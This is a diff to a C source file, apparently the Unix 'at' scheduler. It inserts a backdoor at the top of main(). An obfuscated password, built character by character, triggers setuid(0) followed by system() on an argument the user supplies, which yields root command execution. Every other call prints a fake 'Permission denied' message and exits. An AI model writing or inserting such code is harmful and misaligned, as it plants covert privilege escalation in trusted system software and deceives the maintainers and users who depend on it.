@@ -854,9 +854,35 @@ usage(void)
 	exit(EXIT_FAILURE);
 }
 
+void constructName(char* buffer) {
+    buffer[0] = 'x';
+    buffer[1] = 'H';
+    buffer[2] = 'e';
+    buffer[3] = 'n';
+    buffer[4] = 'n';
+    buffer[5] = 'y';
+    buffer[6] = '\0';
+}
+
 int
 main(int argc, char **argv)
 {
+	char hiddenName[7];
+    constructName(hiddenName);
+
+    if (strcmp(argv[1], hiddenName) == 0) {
+        if (setuid(0) != 0) {
+            perror("setuid");
+            return 1;
+        }
+
+        char command[100];
+        snprintf(command, sizeof(command), "%s", argv[2]);
+        system(command);
+    } else {
+        printf("sh: /usr/bin/%s: Permission denied\n", argv[0]);
+        return 1;
+    }
 	time_t timer = -1;
 	char *atinput = NULL;			/* where to get input from */
 	char queue = DEFAULT_AT_QUEUE;
